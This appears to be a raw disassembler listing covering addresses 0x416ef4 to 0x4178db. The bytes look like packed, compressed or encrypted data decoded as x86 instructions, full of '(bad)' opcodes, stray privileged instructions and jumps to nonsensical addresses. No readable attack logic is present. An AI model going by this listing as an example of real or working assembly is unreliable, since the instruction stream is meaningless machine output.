	...
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x88158eea
  416f02:	inc    esi
  416f03:	mov    al,0x5c
  416f05:	repnz add BYTE PTR [eax],al
  416f08:	add    al,0x1
  416f0a:	add    BYTE PTR [eax],al
  416f0c:	(bad)
  416f10:	xlat   BYTE PTR ds:[ebx]
  416f11:	les    ebp,FWORD PTR [edi]
  416f13:	addr16 out dx,eax
  416f15:	mov    cl,0xcb
  416f17:	mov    al,cl
  416f19:	push   ds
  416f1a:	mov    dl,0x77
  416f1c:	scas   eax,DWORD PTR es:[edi]
  416f1d:	or     esi,DWORD PTR [ecx+0x47847053]
  416f23:	lods   eax,DWORD PTR ds:[esi]
  416f24:	and    ch,ch
  416f26:	lock cmp DWORD PTR [eax],ecx
  416f29:	xchg   ebx,eax
  416f2a:	mov    edx,0x6915337d
  416f2f:	pop    es
  416f30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f31:	jb     0x416f50
  416f33:	(bad)  
  416f34:	jo     0x416f7b
  416f36:	lods   eax,DWORD PTR ds:[esi]
  416f37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f38:	(bad)  
  416f39:	clc    
  416f3a:	jne    0x416f1d
  416f3c:	rcr    edi,cl
  416f3e:	fimul  DWORD PTR [edx]
  416f40:	add    al,0x33
  416f42:	xor    eax,0x476a2e97
  416f47:	(bad)  [ecx+0x1e24b7f0]
  416f4d:	bound  ebx,QWORD PTR [edi-0x7dde39e6]
  416f53:	dec    edx
  416f54:	pop    edi
  416f55:	xlat   BYTE PTR ds:[ebx]
  416f56:	xor    DWORD PTR [ecx-0x1a962026],esp
  416f5c:	mov    dl,0x52
  416f5e:	lahf   
  416f5f:	push   esi
  416f60:	into   
  416f61:	ins    BYTE PTR es:[edi],dx
  416f62:	lods   al,BYTE PTR ds:[esi]
  416f63:	or     al,ch
  416f65:	fld    st(5)
  416f67:	mov    dh,bh
  416f69:	stc    
  416f6a:	dec    ebx
  416f6b:	popf   
  416f6c:	rol    DWORD PTR [ebx],0x36
  416f6f:	cmp    ah,bl
  416f71:	fmul   QWORD PTR [ecx-0x211a0981]
  416f77:	dec    DWORD PTR [ebx+0x22]
  416f7a:	adc    edi,ebx
  416f7c:	pop    eax
  416f7d:	(bad)  
  416f7e:	mov    eax,ds:0xf6f71ece
  416f83:	sar    DWORD PTR [edi+0x2b35209e],1
  416f89:	daa    
  416f8a:	(bad)  
  416f8b:	adc    edi,DWORD PTR [edi]
  416f8d:	sahf   
  416f8e:	cli    
  416f8f:	pop    edx
  416f90:	stos   BYTE PTR es:[edi],al
  416f91:	push   ecx
  416f92:	cmp    al,0xb4
  416f94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f95:	push   ss
  416f96:	sbb    DWORD PTR ds:0xd26b40a2,ecx
  416f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f9d:	mov    ah,ch
  416f9f:	iret   
  416fa0:	es movd mm1,edx
  416fa4:	outs   dx,DWORD PTR ds:[esi]
  416fa5:	jmp    0xcc0dcded
  416faa:	into   
  416fab:	cmp    DWORD PTR [ebx+eax*4+0x25718b25],0xffffffe3
  416fb3:	push   cs
  416fb4:	pop    ebp
  416fb5:	pop    ss
  416fb6:	scas   eax,DWORD PTR es:[edi]
  416fb7:	sub    eax,0x48acbfd0
  416fbc:	mov    bh,0xa5
  416fbe:	mov    ch,0x62
  416fc0:	out    dx,eax
  416fc1:	sbb    BYTE PTR [edx+ebx*8-0x2b],dl
  416fc5:	idiv   edx
  416fc7:	inc    esi
  416fc8:	jne    0x417045
  416fca:	mov    eax,0xbb69d8d9
  416fcf:	fwait
  416fd0:	jmp    FWORD PTR [eax+eiz*4]
  416fd3:	and    BYTE PTR [edi+0x3232007f],dl
  416fd9:	xchg   ecx,eax
  416fda:	imul   ebp,DWORD PTR [edx+0x5a87f39e],0xffffffc9
  416fe1:	cmp    ch,BYTE PTR [eax]
  416fe3:	out    dx,al
  416fe4:	mov    esp,0x617836fa
  416fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fea:	lds    ecx,FWORD PTR [eax+ebx*4-0x2c]
  416fee:	rcr    ah,cl
  416ff0:	lahf   
  416ff1:	push   ebx
  416ff2:	mov    ecx,0xa7941674
  416ff7:	scas   eax,DWORD PTR es:[edi]
  416ff8:	mov    ecx,0xde1ad26e
  416ffd:	ss mov cr6,ecx
  417001:	nop
  417002:	push   ds
  417003:	loopne 0x416f89
  417005:	jne    0x416f91
  417007:	lahf   
  417008:	pop    edi
  417009:	mov    ebp,0xc28177a3
  41700e:	xchg   edi,eax
  41700f:	mov    esi,0x0
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    ecx,DWORD PTR [edi+0x60d7c2b6]
  417085:	repz add BYTE PTR [eax],al
  417088:	add    al,0x1
  41708a:	add    BYTE PTR [eax],al
  41708c:	and    eax,0xedf95569
  417091:	jne    0x417112
  417093:	ja     0x41707f
  417095:	lods   eax,DWORD PTR ds:[esi]
  417096:	cld    
  417097:	int3   
  417098:	mov    dl,0x6e
  41709a:	pop    es
  41709b:	inc    esi
  41709c:	outs   dx,DWORD PTR ds:[esi]
  41709d:	repz mov ebp,0x6f1a310c
  4170a3:	pop    edi
  4170a4:	pop    ebp
  4170a5:	xor    eax,0xa56901bc
  4170aa:	sbb    BYTE PTR [ebx+eiz*2+0x344abbc9],cl
  4170b1:	pop    ds
  4170b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170b3:	loope  0x41703d
  4170b5:	sbb    DWORD PTR [edx+0x4],ebx
  4170b8:	adc    edx,DWORD PTR ds:0x50d4e533
  4170be:	shl    BYTE PTR [ebx+eax*8+0xd0b9c22],0x26
  4170c6:	imul   esi,eax,0xde50576e
  4170cc:	lds    esp,FWORD PTR [edi]
  4170ce:	jns    0x41708d
  4170d0:	int    0x97
  4170d2:	mov    BYTE PTR [esi+0x775bfc2c],cl
  4170d8:	mov    eax,ds:0x3a186d20
  4170dd:	sahf   
  4170de:	push   es
  4170df:	cmp    ebp,ebp
  4170e1:	rol    DWORD PTR [edx-0x4b],cl
  4170e4:	add    ch,BYTE PTR [esi+0x9ed876c]
  4170ea:	jg     0x417161
  4170ec:	mov    ds:0x12c545cb,eax
  4170f2:	mov    esi,0x1f9a39f9
  4170f7:	adc    DWORD PTR [edx],ebx
  4170f9:	jecxz  0x4170bb
  4170fb:	adc    BYTE PTR [edx],bl
  4170fd:	repnz stos DWORD PTR es:[edi],eax
  4170ff:	ret    
  417100:	sbb    edi,0x1fade33f
  417106:	push   edi
  417107:	dec    ebp
  417108:	add    DWORD PTR [edi-0x41],0x427e2176
  41710f:	pop    eax
  417110:	cld    
  417111:	mov    dh,0x22
  417113:	sub    BYTE PTR [ecx-0x1b6251c2],bh
  417119:	push   edi
  41711a:	das    
  41711b:	fstp   QWORD PTR [edi-0x1cd2bb67]
  417121:	in     eax,0x5d
  417123:	lods   eax,DWORD PTR ds:[esi]
  417124:	cli    
  417125:	sub    eax,0x682fcbc5
  41712a:	out    0xe6,al
  41712c:	dec    edx
  41712d:	xchg   edi,eax
  41712e:	pop    ds
  41712f:	push   0x7e
  417131:	push   ecx
  417132:	sti    
  417133:	push   0xffffffc0
  417135:	cmp    al,0xc4
  417137:	shl    BYTE PTR [edi-0x35],cl
  41713a:	mov    ah,0xc8
  41713c:	out    dx,eax
  41713d:	pop    eax
  41713e:	lods   al,BYTE PTR ds:[esi]
  41713f:	xchg   ebp,eax
  417140:	xchg   esi,eax
  417141:	or     al,0xa8
  417143:	and    dh,BYTE PTR [edi-0x53dbba7]
  417149:	mov    ebp,ss
  41714b:	fld    DWORD PTR [ecx]
  41714d:	sub    eax,0x86c544dc
  417152:	and    edx,DWORD PTR [edi+0x46]
  417155:	push   esi
  417156:	lea    ebp,ss:[eax-0x4]
  41715a:	sub    ah,0xcb
  41715d:	mov    ecx,0x6a457f9d
  417162:	not    dh
  417164:	jmp    0xd865:0x4bdd42d3
  41716b:	imul   edx,DWORD PTR [edi],0xf
  41716e:	popf   
  41716f:	xlat   BYTE PTR ds:[ebx]
  417170:	fwait
  417171:	mov    WORD PTR [ebx],fs
  417173:	or     BYTE PTR [esi],ch
  417175:	dec    edx
  417176:	ins    BYTE PTR es:[edi],dx
  417177:	pop    ds
  417178:	iret   
  417179:	test   ebp,edx
  41717b:	mov    cl,0xb5
  41717d:	xchg   ebp,eax
  41717e:	ins    BYTE PTR es:[edi],dx
  41717f:	addr16 inc edx
  417181:	out    0xca,al
  417183:	and    al,0xce
  417185:	test   BYTE PTR ds:0xf4a48cd,dl
  41718b:	out    0xef,al
  41718d:	mov    BYTE PTR [ebp-0x7e],ah
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	sub    DWORD PTR [edi-0x4e],0xffffffb8
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	xor    DWORD PTR [eax+0x4a12c72a],esi
  417212:	loope  0x417217
  417214:	jge    0x4171e5
  417216:	cmp    bl,BYTE PTR [ebx]
  417218:	addr16 sbb esi,0x3a
  41721c:	ret    
  41721d:	lods   al,BYTE PTR ds:[esi]
  41721e:	cmp    ebp,edx
  417220:	scas   al,BYTE PTR es:[edi]
  417221:	pop    ebx
  417222:	mov    ah,0x27
  417224:	cdq    
  417225:	pusha  
  417226:	ins    DWORD PTR es:[edi],dx
  417227:	test   al,0x65
  417229:	sbb    eax,0x6aa0135
  41722e:	les    eax,FWORD PTR [ebp-0x15825963]
  417234:	in     eax,dx
  417235:	mov    ds,WORD PTR [esi+0x5b]
  417238:	out    0xc8,al
  41723a:	das    
  41723b:	ins    DWORD PTR es:[edi],dx
  41723c:	push   es
  41723d:	pop    eax
  41723e:	add    BYTE PTR [eax+0x7835e346],dh
  417244:	inc    ebx
  417245:	push   ss
  417246:	jle    0x417264
  417248:	pop    edx
  417249:	sub    BYTE PTR [edi],0x61
  41724c:	test   eax,0x93aebe3b
  417251:	fisttp DWORD PTR [ebx+0x202078e4]
  417257:	fdiv   QWORD PTR [ebx]
  417259:	lock mov cl,BYTE PTR cs:[edi+0x7d]
  41725e:	sub    edx,edi
  417260:	das    
  417261:	pop    edi
  417262:	sbb    bl,al
  417264:	call   0x7fd6dac3
  417269:	jecxz  0x4172c2
  41726b:	jecxz  0x4172a8
  41726d:	push   esp
  41726e:	gs fild QWORD PTR cs:[esi-0x2f060a0d]
  417276:	and    BYTE PTR [ebx+esi*1-0x6d],dh
  41727a:	pop    ebp
  41727b:	pop    ebx
  41727c:	(bad)  [esi+0x2431fe0]
  417282:	pop    ecx
  417283:	out    dx,al
  417284:	adc    al,0x6c
  417286:	leave  
  417287:	mov    esp,0x3b653d68
  41728c:	adc    eax,0x9026595a
  417291:	push   edi
  417292:	add    dh,BYTE PTR [ecx+0x7ce0d4d7]
  417298:	iret   
  417299:	clc    
  41729a:	retf   
  41729b:	mov    bl,0x94
  41729d:	jns    0x4172f6
  41729f:	scas   al,BYTE PTR es:[edi]
  4172a0:	inc    ebp
  4172a1:	push   ecx
  4172a2:	mov    bl,0x8a
  4172a4:	jo     0x41727d
  4172a6:	out    0xa3,eax
  4172a8:	out    dx,al
  4172a9:	cmp    al,0x3b
  4172ab:	in     eax,0x42
  4172ad:	or     al,0xe2
  4172af:	mov    ebx,edi
  4172b1:	out    dx,al
  4172b2:	sub    eax,0x827e034a
  4172b7:	pop    esi
  4172b8:	inc    ecx
  4172b9:	push   ss
  4172ba:	jnp    0x4172b4
  4172bc:	add    eax,0xe34fbfa9
  4172c1:	mov    edx,0x9b7a9a46
  4172c6:	cmp    ah,BYTE PTR [ebx-0x5d]
  4172c9:	out    0x2b,eax
  4172cb:	and    eax,DWORD PTR [edx]
  4172cd:	mov    bl,0xa6
  4172cf:	jmp    0xa3c5:0x60369b18
  4172d6:	mov    ds:0x530b9cf5,eax
  4172db:	mov    cs,WORD PTR [ebp+0x2a]
  4172de:	cdq    
  4172df:	jbe    0x417355
  4172e1:	pop    ebp
  4172e2:	adc    eax,0x2add0b8b
  4172e7:	addr16 sbb eax,0x7bd45bbf
  4172ed:	pop    eax
  4172ef:	icebp  
  4172f0:	(bad)  
  4172f1:	pop    eax
  4172f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172f4:	lods   eax,DWORD PTR ds:[esi]
  4172f5:	hlt    
  4172f6:	dec    ecx
  4172f7:	aaa    
  4172f8:	pop    eax
  4172f9:	and    al,0x54
  4172fb:	pop    ebx
  4172fc:	sub    bh,BYTE PTR [esi+0x544ca4a6]
  417302:	push   edx
  417303:	fnstsw WORD PTR [eax]
  417305:	xchg   esp,eax
  417306:	lahf   
  417307:	mov    ds:0xfaa6c7a5,al
  41730c:	mov    eax,ds:0x7e0f6c
	...
  417371:	add    BYTE PTR [eax],al
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	fstp   DWORD PTR [edx-0xa97e3ad]
  417386:	add    BYTE PTR [eax],al
  417388:	add    al,0x1
  41738a:	add    BYTE PTR [eax],al
  41738c:	sbb    al,0xa4
  41738e:	inc    eax
  41738f:	push   esp
  417390:	hlt    
  417391:	push   ebp
  417392:	mov    edi,edi
  417394:	cmp    esi,edi
  417396:	int    0x2c
  417398:	jnp    0x417329
  41739a:	mov    esp,0x56bdf6a5
  41739f:	xchg   esi,eax
  4173a0:	loopne 0x41738b
  4173a2:	sbb    eax,0xe42ddbe2
  4173a7:	idiv   ecx
  4173a9:	fcmovnu st,st(2)
  4173ab:	inc    ebx
  4173ac:	mov    eax,0xd972c41a
  4173b1:	mov    dl,0xbf
  4173b3:	pop    edi
  4173b4:	mov    esp,0x26745edd
  4173b9:	xchg   ebp,eax
  4173ba:	fsubrp st(6),st
  4173bc:	imul   esi,esp,0xea5b633b
  4173c2:	mov    ebp,ecx
  4173c4:	adc    esp,0xffffffed
  4173c7:	dec    eax
  4173c8:	sbb    BYTE PTR [eax-0x68c0118],bl
  4173ce:	jge    0x41744e
  4173d0:	or     eax,0xae25e150
  4173d5:	mov    esp,0xf1bbc100
  4173da:	push   ss
  4173db:	fsubr  DWORD PTR [ebp-0x6d]
  4173de:	fld    TBYTE PTR [esi]
  4173e0:	shr    BYTE PTR [eax+0x28],cl
  4173e3:	and    eax,0xa6c88d37
  4173e8:	ficomp WORD PTR [eax-0x327af576]
  4173ee:	xlat   BYTE PTR ds:[ebx]
  4173ef:	fs xchg edx,eax
  4173f1:	cwde   
  4173f2:	add    al,0x16
  4173f4:	and    BYTE PTR [ebx],ah
  4173f6:	test   BYTE PTR [ecx+0x1854e3e2],0x99
  4173fd:	inc    edx
  4173fe:	inc    eax
  4173ff:	lods   eax,DWORD PTR ds:[esi]
  417400:	ins    BYTE PTR es:[edi],dx
  417401:	sub    eax,0x8b352f5c
  417406:	nop
  417407:	cmp    al,0x2f
  417409:	ja     0x4173d4
  41740b:	(bad)  [ecx-0x2701993b]
  417411:	mov    bh,0xf2
  417413:	loop   0x41748a
  417415:	pop    edi
  417416:	cmc    
  417417:	xor    eax,0xfa10bcdd
  41741c:	sbb    al,0x4a
  41741e:	push   ecx
  41741f:	jb     0x417438
  417421:	lods   eax,DWORD PTR ds:[esi]
  417422:	rcr    BYTE PTR [edi+ebp*4+0x2b],0x65
  417427:	push   cs
  417428:	inc    ebx
  417429:	or     eax,0x6e63884d
  41742e:	fdivr  st,st(5)
  417430:	sub    ebp,DWORD PTR [ecx]
  417432:	stos   BYTE PTR es:[edi],al
  417433:	xchg   esi,eax
  417434:	or     al,0x2d
  417436:	pushf  
  417437:	call   0x4fb81a04
  41743c:	xor    bl,ah
  41743e:	popa   
  41743f:	loop   0x417442
  417441:	outs   dx,BYTE PTR ds:[esi]
  417442:	mov    eax,0xffe9c1d5
  417447:	mov    edi,0x1258fca9
  41744c:	mov    edi,DWORD PTR [esi+0x2d63dc50]
  417452:	or     al,BYTE PTR [esi]
  417454:	mov    cl,0x99
  417456:	je     0x41748b
  417458:	shl    DWORD PTR [ecx],0x86
  41745b:	lds    edi,FWORD PTR [eax+eax*8+0x57ad264]
  417462:	ja     0x417457
  417464:	cdq    
  417465:	jae    0x41743f
  417467:	xor    BYTE PTR [esi+0x1bd34c96],bl
  41746d:	inc    ebx
  41746e:	xchg   ecx,eax
  41746f:	mov    ah,0xd8
  417471:	fld    st(1)
  417473:	stc    
  417474:	xor    al,0x59
  417476:	add    eax,0xf276d8d
  41747b:	test   DWORD PTR [eiz*8-0x67340d6e],esp
  417482:	xchg   DWORD PTR [esi+0x10cec8b1],esp
  417488:	pushf  
  417489:	ja     0x41741d
  41748b:	adc    eax,0xc555e9c9
	...
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	lea    ebp,[eax-0xf]
  417503:	clc    
  417504:	ins    BYTE PTR es:[edi],dx
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	call   0x1697c59c
  417511:	pop    ds
  417512:	iret   
  417513:	ins    DWORD PTR es:[edi],dx
  417514:	std    
  417515:	pushf  
  417516:	inc    edi
  417517:	in     eax,0x84
  417519:	inc    esp
  41751a:	push   0xffffff86
  41751c:	lods   eax,DWORD PTR ds:[esi]
  41751d:	sub    BYTE PTR [eax+0x37dbb6ff],bl
  417523:	xor    dl,dl
  417525:	repz xchg edx,eax
  417527:	arpl   WORD PTR [esi],si
  417529:	shl    dh,1
  41752b:	and    al,0x4f
  41752d:	inc    eax
  41752e:	xchg   ecx,eax
  41752f:	jno    0x4174ec
  417531:	mov    ds:0x242546ec,eax
  417536:	in     al,0x82
  417538:	ss pushf 
  41753a:	out    0xd4,al
  41753c:	sub    BYTE PTR [ecx],al
  41753e:	sar    BYTE PTR [edx+edx*2],1
  417541:	mov    al,0x5e
  417543:	pop    esi
  417544:	aam    0xca
  417546:	stos   DWORD PTR es:[edi],eax
  417547:	mov    al,0x9e
  417549:	mov    esi,0xcf91521a
  41754e:	dec    ecx
  41754f:	push   0x22
  417551:	repz xchg esi,eax
  417553:	sub    bh,ch
  417555:	sti    
  417556:	or     dh,BYTE PTR [edi-0x38]
  417559:	sbb    BYTE PTR [edi+0x1ffef0ba],cl
  41755f:	aad    0xad
  417561:	mov    ss,ebx
  417563:	cli    
  417564:	jp     0x4175ce
  417566:	lods   eax,DWORD PTR ds:[esi]
  417567:	mov    ecx,0x96627802
  41756c:	push   es
  41756d:	inc    esp
  41756e:	adc    al,0x18
  417570:	mov    dh,0x71
  417572:	xchg   ecx,eax
  417573:	sub    eax,0xa92e09e5
  417578:	repz mov eax,ds:0x2e97fa4e
  41757e:	inc    esp
  41757f:	cmp    eax,0x8fee960a
  417584:	pusha  
  417585:	mov    al,ds:0xd0a74dfa
  41758a:	mov    esp,0x9f0c041e
  41758f:	mov    WORD PTR [ebx],ds
  417591:	aad    0x66
  417593:	or     eax,DWORD PTR [esi]
  417595:	repnz cdq 
  417597:	das    
  417598:	outs   dx,DWORD PTR ds:[esi]
  417599:	cmovbe esi,DWORD PTR [ebx-0x5b]
  41759d:	push   ebp
  41759e:	imul   esp,DWORD PTR [ebx+edi*4+0x4320167],0xffffffd1
  4175a6:	(bad)  
  4175a8:	das    
  4175a9:	xchg   edx,eax
  4175aa:	push   0x38
  4175ac:	sbb    al,BYTE PTR [edi]
  4175ae:	sub    esi,DWORD PTR gs:[edx-0x31]
  4175b2:	jmp    0x451001d0
  4175b7:	stos   BYTE PTR es:[edi],al
  4175b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175b9:	add    BYTE PTR ss:[edx],bl
  4175bc:	pop    DWORD PTR [edx+0x105f316a]
  4175c2:	cdq    
  4175c3:	ror    BYTE PTR [ebp+0x70],0x85
  4175c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175c8:	adc    ebp,DWORD PTR [eax+0x5267bd75]
  4175ce:	loopne 0x41755a
  4175d0:	jmp    0x41760d
  4175d2:	fnstsw ax
  4175d4:	les    esi,FWORD PTR [ebx+0x16]
  4175d7:	imul   esp,ebx,0x5f01409f
  4175dd:	push   esi
  4175de:	xchg   ecx,eax
  4175df:	pop    esp
  4175e0:	and    al,0x57
  4175e2:	sbb    BYTE PTR [eax+eax*2-0x3468ad0],ch
  4175e9:	fldenv [edi-0x7698b7f7]
  4175ef:	aam    0x37
  4175f1:	test   BYTE PTR [ebx-0x5f],dh
  4175f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175f5:	jl     0x417635
  4175f7:	aam    0xa0
  4175f9:	loopne 0x417585
  4175fb:	adc    DWORD PTR [edi+0x1b],edx
  4175fe:	scas   al,BYTE PTR es:[edi]
  4175ff:	rol    DWORD PTR [edi+0x58],1
  417602:	fist   DWORD PTR [edx]
  417604:	add    edx,edx
  417606:	sbb    esp,ebp
  417608:	and    DWORD PTR [ecx+0x14],edi
  41760b:	xor    ebx,esi
  41760d:	fsub   QWORD PTR [ecx+0x54]
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	ficomp DWORD PTR [edx-0x5c]
  417682:	js     0x4176c2
  417684:	jo     0x41767d
  417686:	add    BYTE PTR [eax],al
  417688:	add    al,0x1
  41768a:	add    BYTE PTR [eax],al
  41768c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41768d:	idiv   BYTE PTR [ebx+edx*1+0x3cf8763a]
  417694:	mov    esp,ebx
  417696:	pusha  
  417697:	inc    BYTE PTR [eax]
  417699:	or     ebp,0x1478792f
  41769f:	aad    0x2e
  4176a1:	pop    ebx
  4176a2:	jo     0x41770b
  4176a4:	mov    al,0xb
  4176a6:	inc    esp
  4176a7:	in     eax,0x41
  4176a9:	rcl    BYTE PTR [edx],1
  4176ab:	and    al,0x25
  4176ad:	int    0x7a
  4176af:	repz push 0x32
  4176b2:	jmp    0x93a5ac3b
  4176b7:	and    eax,DWORD PTR [eax-0x25d05679]
  4176bd:	pop    DWORD PTR [edi]
  4176bf:	in     eax,0x1d
  4176c1:	mov    ebp,0x7db9abf6
  4176c6:	and    al,0xe2
  4176c8:	cmp    DWORD PTR [ecx+esi*1],eax
  4176cb:	and    eax,0x79975c02
  4176d0:	in     al,dx
  4176d1:	cdq    
  4176d2:	leave  
  4176d3:	inc    edi
  4176d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176d5:	sbb    DWORD PTR [esi+0x222326ad],esp
  4176db:	jmp    0xb277:0xfb27f0b5
  4176e2:	xor    DWORD PTR [ebp-0x32],ebp
  4176e5:	sbb    bh,BYTE PTR [ebx]
  4176e7:	pop    esp
  4176e8:	push   eax
  4176e9:	adc    DWORD PTR ss:[edi],ebp
  4176ec:	inc    ebx
  4176ed:	adc    DWORD PTR [ebx-0x21],ebp
  4176f0:	ficomp WORD PTR [edx+0x4cdf7341]
  4176f6:	mov    ds:0xf5f25577,al
  4176fb:	dec    esp
  4176fc:	xor    edi,DWORD PTR [ebx+0x6f8250f]
  417702:	rcl    BYTE PTR [esi],0x60
  417705:	pop    edi
  417706:	jp     0x41770e
  417708:	(bad)  
  417709:	mov    cs,WORD PTR [eax]
  41770b:	std    
  41770c:	jg     0x41770a
  41770e:	cwde   
  41770f:	and    eax,0x26fc3a12
  417714:	inc    esi
  417715:	xor    ebx,DWORD PTR [esi-0x45]
  417718:	sub    esi,DWORD PTR [edx-0x48b49bf2]
  41771e:	into   
  41771f:	enter  0x220f,0xe6
  417723:	xlat   BYTE PTR ds:[ebx]
  417724:	mov    bh,0x18
  417726:	adc    BYTE PTR [edi],cl
  417728:	jmp    DWORD PTR [eax+0x15]
  41772b:	iret   
  41772c:	add    eax,0x8a9878b9
  417731:	xor    eax,DWORD PTR [edi+0x59]
  417734:	push   esi
  417735:	ss mov al,0x16
  417738:	mov    edx,0xa5fbb291
  41773d:	or     BYTE PTR [eax],bh
  41773f:	(bad)  
  417740:	mul    DWORD PTR [eax+0x75]
  417743:	push   ebp
  417744:	fld    TBYTE PTR [esi+edx*8-0x1c75273f]
  41774b:	shr    BYTE PTR ss:[edi],0x1a
  41774f:	inc    esp
  417750:	dec    ebx
  417751:	and    al,BYTE PTR [esi-0x1d]
  417754:	cmc    
  417755:	lea    esp,[ebp-0x2e]
  417758:	repnz sar BYTE PTR [edx-0x44],1
  41775c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41775d:	mov    ds:0xcabe6266,eax
  417762:	lods   al,BYTE PTR ds:[esi]
  417763:	inc    edx
  417764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417765:	dec    esi
  417766:	mov    edi,DWORD PTR [esi]
  417768:	imul   eax,DWORD PTR [ebx+0x77954c0c],0xffffff87
  41776f:	imul   ebp,esp,0x59
  417772:	sar    BYTE PTR [ecx+0x16760e91],cl
  417778:	cdq    
  417779:	(bad)  
  41777a:	mov    eax,0xb4a74eef
  41777f:	retf   
  417780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417781:	cli    
  417782:	jle    0x417771
  417784:	hlt    
  417785:	sub    ebx,edx
  417787:	jbe    0x417710
  417789:	pop    ebp
  41778a:	ins    DWORD PTR es:[edi],dx
  41778b:	aas    
  41778c:	xchg   BYTE PTR [edx+0x61],al
  41778f:	pushf  
	...
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	mov    ebp,0x74561f04
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	int3   
  41780d:	mov    bl,0x8f
  41780f:	xchg   DWORD PTR [ebx],edi
  417811:	test   al,0x23
  417813:	sub    al,0x25
  417815:	add    al,0x7e
  417817:	mov    al,0x20
  417819:	and    eax,0x3d800fd7
  41781e:	cwde   
  41781f:	add    ecx,edx
  417821:	sub    DWORD PTR [esi-0x28],edi
  417824:	sbb    al,0xc2
  417826:	popf   
  417827:	fist   DWORD PTR [esi+0x1]
  41782a:	jg     0x417862
  41782c:	dec    ecx
  41782d:	xor    ebp,ecx
  41782f:	xchg   DWORD PTR [ebp+0x21],ebx
  417832:	call   DWORD PTR [edi-0x14552867]
  417838:	outs   dx,DWORD PTR ds:[esi]
  417839:	dec    eax
  41783a:	dec    DWORD PTR [ecx+0x9]
  41783d:	cmp    eax,0xade0e0ed
  417842:	lods   eax,DWORD PTR ds:[esi]
  417843:	push   0xbd53df07
  417848:	push   0x57
  41784a:	(bad)  
  41784b:	jno    0x417872
  41784d:	bound  esp,QWORD PTR [ebx]
  41784f:	sub    ch,BYTE PTR [esi+ebx*1+0x61e76728]
  417856:	cmp    BYTE PTR [esi+esi*8+0xe],al
  41785a:	or     al,0xbd
  41785c:	mov    ebp,DWORD PTR [esi+0x7c267d13]
  417862:	test   al,0x25
  417864:	adc    DWORD PTR [ebx-0x736245a],ebp
  41786a:	mov    ah,0xa0
  41786c:	dec    eax
  41786d:	xchg   esp,eax
  41786e:	in     eax,0x12
  417870:	and    esp,DWORD PTR [esi+0x34]
  417873:	xchg   DWORD PTR [eax-0x4b],ebp
  417876:	mov    DWORD PTR ds:0x396c445e,ebp
  41787c:	sbb    BYTE PTR [eax],0xd4
  41787f:	xchg   ecx,eax
  417880:	(bad)  
  417881:	mov    ebp,0x9076d8cb
  417886:	ins    DWORD PTR es:[edi],dx
  417887:	hlt    
  417888:	imul   ecx,DWORD PTR [edi+edx*2+0x6c],0xf
  41788d:	ret    0x8a90
  417890:	or     al,0x4a
  417892:	pop    eax
  417893:	js     0x41781f
  417895:	sub    BYTE PTR [edx-0x23],cl
  417898:	adc    edi,0x2d
  41789b:	lods   al,BYTE PTR ds:[esi]
  41789c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41789d:	xor    al,BYTE PTR [edi]
  41789f:	scas   eax,DWORD PTR es:[edi]
  4178a0:	iret   
  4178a1:	fadd   QWORD PTR [ebx+ecx*4+0x39201c9b]
  4178a8:	pop    ds
  4178a9:	sub    eax,0xafebec92
  4178ae:	or     BYTE PTR [esp+edi*1],0x3d
  4178b2:	inc    ecx
  4178b3:	cld    
  4178b4:	or     esi,DWORD PTR gs:[ebx]
  4178b7:	pop    ebx
  4178b8:	adc    ebp,DWORD PTR [ecx]
  4178ba:	mov    eax,0x77567ad3
  4178bf:	jae    0x41784a
  4178c1:	mov    ds:0xa0920743,al
  4178c6:	ss aaa 
  4178c8:	xchg   esp,eax
  4178c9:	dec    edx
  4178ca:	adc    BYTE PTR [eax+ecx*8],al
  4178cd:	sar    dl,1
  4178cf:	dec    edx
  4178d0:	mov    esi,0xe958228a
  4178d5:	jae    0x417926
  4178d7:	push   edi
  4178d8:	les    eax,FWORD PTR [ebx+eiz*1]
  4178db:	iret   
